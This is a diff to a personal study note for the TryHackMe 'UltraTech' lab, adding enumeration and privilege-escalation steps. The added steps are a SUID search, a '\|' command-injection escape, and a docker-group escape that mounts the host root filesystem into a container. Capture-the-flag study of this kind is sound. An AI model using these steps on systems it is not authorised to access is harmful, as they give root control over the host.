@@ -1,7 +1,7 @@
 
 2024-07-11 20:46
 
-Source: #web #youtube 
+Source: #web #youtube #privesc 
 
 Tags: [[nmap]]
 #### Enumeration 
@@ -34,11 +34,28 @@ save the file with `.b64` extension the decode it using `base64 -d file.b64
 
 check if a service is available on a machine or not by using - `which service_name`
 
-character escape 
+we can try character escape by using `\|` 
+#### Escalation
 
+```
+find / -perm -4000 2>/dev/null
+```
+
+if nothing sticks out from the above command 
+1. go to the `opt` directory  
+2. we find `containerd` dir 
+3. check the group we are in by using `id` command 
+since we are in the docker group we can use find exploits in gtfobins for [[docker]] 
+- find local docker images using `docker images`
+- run the below command further (bash is the local image found on the machine)
+```
+docker run -v /:/mnt --rm -it bash
+```
 
 ### References
 [TryHackMe | UltraTech](https://tryhackme.com/r/room/ultratech1)
 
 video soln- 
 https://www.youtube.com/watch?v=b8hUHRus6cw
+
+[TryHackMe - Ultratech – sckull](https://sckull.github.io/posts/ultratech/#ftp-ssh)
